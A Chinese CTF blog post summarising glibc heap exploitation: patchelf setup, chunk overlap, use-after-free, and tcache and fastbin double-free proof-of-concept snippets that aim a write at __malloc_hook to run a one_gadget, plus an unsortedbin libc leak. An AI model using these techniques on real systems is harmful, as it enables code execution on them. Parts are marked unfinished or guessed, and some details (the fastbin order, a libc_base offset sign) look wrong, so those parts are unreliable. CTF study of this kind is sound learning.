<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"heygap.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="总结一下 Heap 的相关内容，便于后续调用">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn - Heap Exploit Summary">
<meta property="og:url" content="http://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/index.html">
<meta property="og:site_name" content="Gap&#39;s_Blog">
<meta property="og:description" content="总结一下 Heap 的相关内容，便于后续调用">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-09-22T02:54:00.000Z">
<meta property="article:modified_time" content="2024-02-07T16:43:57.265Z">
<meta property="article:author" content="Gap">
<meta property="article:tag" content="Heap">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Pwn - Heap Exploit Summary | Gap's_Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Gap's_Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">靡不有初 鲜克有终</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/HeyGap" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Gap">
      <meta itemprop="description" content="An undergraduate student of Cybersecurity at SDU.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Gap's_Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Pwn - Heap Exploit Summary
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-09-22 10:09:00" itemprop="dateCreated datePublished" datetime="2023-09-22T10:54:00+08:00">2023-09-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-02-08 00:02:26" itemprop="dateModified" datetime="2024-02-08T00:43:57+08:00">2024-02-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-Theory/" itemprop="url" rel="index"><span itemprop="name">CTF_Theory</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote class="blockquote-center">
总结一下 Heap 的相关内容，便于后续调用
</blockquote>

<span id="more"></span>
<h1 id="Patchelf的使用方式"><a href="#Patchelf的使用方式" class="headerlink" title="Patchelf的使用方式"></a>Patchelf的使用方式</h1><blockquote>
<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理 heap，因此我们需要将本地的 elf 文件的链接部分 patch 一下，使其与远程链接的 libc 文件保持一致。</p>
</blockquote>
<h2 id="libc-包的下载"><a href="#libc-包的下载" class="headerlink" title="libc 包的下载"></a>libc 包的下载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有时我们需要的 libc 包不在 list 中，我们可以自己尝试解构命令来下载。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
<h2 id="patch-elf文件"><a href="#patch-elf文件" class="headerlink" title="patch elf文件"></a>patch elf文件</h2><blockquote>
<p>识别需要 patch 的文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与 <code>ld-linux-x86-64.so.2</code> 等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
<p>tip2：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器与动态链接库</span></span><br><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
<h1 id="详解-‘申请与释放-chunk’-未完成"><a href="#详解-‘申请与释放-chunk’-未完成" class="headerlink" title="详解 ‘申请与释放 chunk’(未完成)"></a>详解 ‘申请与释放 chunk’(未完成)</h1><h2 id="申请-chunk"><a href="#申请-chunk" class="headerlink" title="申请 chunk"></a>申请 chunk</h2><ol>
<li><p>如果是第一次申请，则 malloc 一块内存来存放 <code>tcache_perthread_struct</code></p>
</li>
<li><p>查看要申请的 chunk 的大小，记作 <code>SIZE</code></p>
</li>
<li><p>检查各种 bin  </p>
<ol>
<li>(libc2.26及之后) <code>SIZE</code> 属于 [0x0,small bin size)，检查 tcachebin，有合适的 chunk 则返回</li>
<li>根据版本有不同选择  <ol>
<li>(libc2.26之前)<code>SIZE</code> 属于 [0x0,0x78]，检查 fastbins，有合适的 chunk 则检查 size 域是否正确，正确则返回</li>
<li>(libc2.26及之后)<code>SIZE</code> 属于 [0x0,0x78]，将对应 fastbin 一整条链挪进 tcachebin 的对应链上，并取出 newest_chunk 返回</li>
</ol>
</li>
<li>smallBin largeBin 还没学</li>
<li>检查 unsortedBin，如果 <code>SIZE</code> 小于 “unsortedbin 的某个 chunk 的 size”，则:<ol>
<li>以0x10为基本单位切割出申请的 chunk 并返回，剩下的部分叫做 last remainder chunk</li>
</ol>
</li>
</ol>
</li>
<li>检查 topchunk，如果 <code>SIZE</code> 小于 “topchunk 的 size”，则:<ol>
<li>以0x10为基本单位切割出申请的 chunk 并返回</li>
</ol>
</li>
<li>用 Brk 再拉几页内存出来，还没学</li>
</ol>
<h2 id="释放-chunk"><a href="#释放-chunk" class="headerlink" title="释放 chunk"></a>释放 chunk</h2><ol>
<li>查看要释放的 chunk 的大小，记作<code>SIZE</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 猜测，尚不确定</span><br><span class="line">n. 检查 prev_inuse 位，若为0，则:  </span><br><span class="line">    1. 如果 chunk 不在 fastbin/tcachebin，则前向合并，并继续递归检验 prev_inuse</span><br><span class="line">    2. 如果 chunk 在 fastbin/tcachebin，则获取前一个 chunk 的 size，并存到 prev_size 域</span><br></pre></td></tr></table></figure>
<h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2 的内容的效果。分为前向和后向两种</p>
<h2 id="后向-Overlap"><a href="#后向-Overlap" class="headerlink" title="后向 Overlap"></a>后向 Overlap</h2><p>堆区模型：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉 chunk2 的内容</p>
<h2 id="前向-Overlap"><a href="#前向-Overlap" class="headerlink" title="前向 Overlap"></a>前向 Overlap</h2><p>堆区模型：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时 bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的 chunk2 与 chunk3</p>
<h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>概述：在<code>free(chunk_ptr)</code>后并没有<code>chunk_ptr=0</code>，导致我们仍然能通过<code>chunk_ptr</code>对这个chunk进行修改</p>
<h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
<p>libc2.27之前，主要是 fastbin double free</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Fastbin</p>
<blockquote>
<p>libc2.27-2.28，主要是 tcachebin double free</p>
<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用 fastbin/smallbin</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin</p>
<h1 id="Kinds-of-Bin"><a href="#Kinds-of-Bin" class="headerlink" title="Kinds of Bin"></a>Kinds of Bin</h1><h2 id="Tcachebin"><a href="#Tcachebin" class="headerlink" title="Tcachebin"></a>Tcachebin</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><h4 id="bss段-heap-list-泄露"><a href="#bss段-heap-list-泄露" class="headerlink" title="bss段 heap_list 泄露"></a>bss段 heap_list 泄露</h4><blockquote>
<p>Libc: 2.26 - </p>
<p>应用场景: </p>
</blockquote>
<ol>
<li><p>UAF</p>
</li>
<li><p>alloc 不会覆盖 fd</p>
</li>
</ol>
<h3 id="Write"><a href="#Write" class="headerlink" title="Write"></a>Write</h3><h4 id="Double-Free-1"><a href="#Double-Free-1" class="headerlink" title="Double Free"></a>Double Free</h4><blockquote>
<p>Libc: 2.27 - 2.31</p>
<p>应用场景:</p>
</blockquote>
<ol>
<li><p>7个 tcachebin chunk，2个 fastbin chunk，bins 构造完成后至少可以 alloc 10次</p>
</li>
<li><p>free 后还能再 free 同一个 chunk</p>
</li>
</ol>
<blockquote>
<p>相关特性: </p>
</blockquote>
<ol>
<li><p>2.27之后，tcachebin 加入了 key 值检验，因此直接劫持 tcachebin 链比较困难(需要伪造 key 值)。</p>
</li>
<li><p>(具体是 stash 机制，我是按下面这样理解的)但当 tcachebin 某一条链的 chunk 全部取出，且对应大小的 fastbin 上仍有 chunk，ptmalloc 会将 fastbin 对应链上的全部 chunk 取出，并按 fastbin 顺序装载到 tcachebin 中。此时 ptmalloc 不会检测 fastbin 的全部 chunk 是否合法，并且 ptmalloc 还会为每个 chunk 构造合法 key 值，所以我们可以先劫持 fastbin 链，然后清空 tcachebin 后劫持 tcachebin 链。</p>
</li>
<li><p>在检查 key 值之后，从 tcachebin 中申请 chunk 的检测机制比较薄弱，不需要考虑 fd 指向的地址的 size 域是否合法</p>
</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol>
<li><p>申请9个同样大小的 chunk，依次释放，再释放一次 chunk7</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>申请7个 chunk，清空 tcachebin 链。再申请 chunk7，将 fastbin 中的所有 chunk 转移到 tcachebin 中.</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># 此时 tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>申请3个 chunk，此时我们就可以通过改变 chunk9 的值，来 write 任意位置了.</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>例题: </p>
</blockquote>
<ol>
<li><a href="">杭电hgame2024-week2 fastnote</a></li>
</ol>
<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><ol>
<li>Fastbin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fastbin</span>: (头节点)<span class="title function_">oldest_chunk</span>(first out) -&gt; ... </span><br><span class="line">  ... -&gt; (尾节点)<span class="title function_">newest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="Leak-1"><a href="#Leak-1" class="headerlink" title="Leak"></a>Leak</h3><h3 id="Write-1"><a href="#Write-1" class="headerlink" title="Write"></a>Write</h3><h4 id="Double-Free-2"><a href="#Double-Free-2" class="headerlink" title="Double Free"></a>Double Free</h4><blockquote>
<p>Libc: 2.27之前</p>
<p>应用场景: </p>
</blockquote>
<ol>
<li>free 后还能再 free 同一个 chunk</li>
</ol>
<blockquote>
<p>fastbin 相关特性:</p>
</blockquote>
<ol>
<li><p><code>free</code>: 在 free chunk 到 fastbin 的过程中，会有以下 check： </p>
<ol>
<li>检测这个 chunk 和尾节点是否是同一个 chunk，如果是，则触发<code>Error in &#39;./vuln&#39;: double free or corruption (fasttop): 0x17170c0</code></li>
</ol>
</li>
<li><p><code>malloc</code>: 从 fastbin 申请 chunk 时，会有以下 check:  </p>
<ol>
<li>检测这个 chunk 的 fd 指向的内存的 size 是否符合所属 fastbin，如果不属于，则触发<code>Error in &#39;./vuln&#39;: malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
</ol>
</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol>
<li><p>构建 fastbin: chunk1 -&gt; chunk2 -&gt; chunk1  </p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>malloc(chunk1)，同时修改 chunk1 的 fd, 此时 fastbin 中构造为 chunk2 -&gt; chunk1 -&gt; address（address 有如下选择）  </p>
<ol>
<li>libc.sym[‘__malloc_hook’] - 0x23 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># 注意不要把 &#x27;\n&#x27; 也当做 payload 传过去了</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>malloc(chunk2), malloc(chunk1)</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>malloc(address)，同时修改 address 处的内容，对应<code>&#39;2.&#39;</code>中的不同选择，有不同的填充方式  </p>
<ol>
<li>payload = b’a’*19 + one_gadget <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    正好是__malloc_hook的位置</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<blockquote>
<p>例题</p>
</blockquote>
<ol>
<li><p><a href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF babyheap_0ctf_2017</a></p>
</li>
<li><p><a href="">杭电hgame2024-week2 old_fastnote</a></p>
</li>
</ol>
<h2 id="Unsortedbin"><a href="#Unsortedbin" class="headerlink" title="Unsortedbin"></a>Unsortedbin</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><blockquote>
<p>Libc: Any</p>
<p>应用场景:</p>
</blockquote>
<ol>
<li><p>UAF</p>
</li>
<li><p>alloc 至少不会覆盖 bk</p>
</li>
</ol>
<p>当unsortedbin中有且仅有一个chunk时， </p>
<p>该chunk的fd和bk会指向 &amp;main_arena + 96，</p>
<p>貌似libc2.31是96，libc2.23是88，</p>
<p>具体做题用 pwndbg 看最低四位是 0x8 还是 0x0，0x8-&gt;88,0x0-&gt;96</p>
<p>而这个地址可以用ida查看对应libc的 malloc_trim 函数找到，从而帮助计算 libc_base.  </p>
<p>当然这个地址也是 &amp;__malloc_hook + 0x10，具体看下面的代码注释.  </p>
<p>如果我们把 unsortedbin 中唯一一个 chunk 记作 chunk0，则: </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内存中的 main_arena 地址，一般为0x7f...</span></span><br><span class="line">main_arena = chunk0.fd - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基址:</span></span><br><span class="line"><span class="comment"># main_arena 在 libc 中的偏移，正好等于 </span></span><br><span class="line"><span class="comment"># __malloc_hook 的偏移 + 0x10。</span></span><br><span class="line"><span class="comment"># 即 &amp;main_arena = &amp;__malloc_hook + 0x10。</span></span><br><span class="line">libc_base = main_arena - ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>).sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们也可以直接用 IDA 打开 libc,</span></span><br><span class="line"><span class="comment"># 找到 __malloc_trim 函数,</span></span><br><span class="line"><span class="comment"># 直接在 22 行附近找到类似于</span></span><br><span class="line"><span class="comment"># _R15 = &amp;dword_1ECB80 的语句,</span></span><br><span class="line"><span class="comment"># 这里 main_arena 的偏移就是 0x1ECB80</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>bypass</p>
</blockquote>
<ol>
<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>会用’\x00’填充不够 nbytes 的部分，因此我们在 <code>alloc</code> 或者 <code>edit</code> 的时候注意 nbytes = 0x08 即可，这样不会覆盖 bk 的 &amp;main_arena</li>
</ol>
<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write是指</p>
<p>此外，低libc版本的unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
<ul>
